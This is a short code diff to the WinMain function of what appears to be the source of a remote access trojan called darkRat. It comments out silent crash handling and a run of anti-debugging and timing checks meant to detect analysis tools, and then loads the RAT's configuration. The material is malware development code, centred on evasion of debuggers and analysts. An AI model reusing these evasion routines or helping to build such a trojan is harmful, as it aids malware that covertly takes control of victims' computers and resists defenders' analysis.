@@ -65,10 +65,11 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 		LPSTR szCmdLine,        // Command line arguments.  similar to argv in standard C programs
 		int iCmdShow){
 #endif
+	/*
 	SetUnhandledExceptionFilter(unhandled_exception_handler);
 	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
 	_set_abort_behavior(0, _WRITE_ABORT_MSG | _CALL_REPORTFAULT);
-	
+
 	adbg_IsDebuggerPresent();
 	adbg_IsDebuggerPresent();
 	adbg_CheckRemoteDebuggerPresent();
@@ -79,6 +80,7 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 	adbg_RDTSC();
 	adbg_QueryPerformanceCounter();
 	adbg_GetTickCount();
+	*/
 	
 
 	darkRat::config::config config = darkRat::config::load();
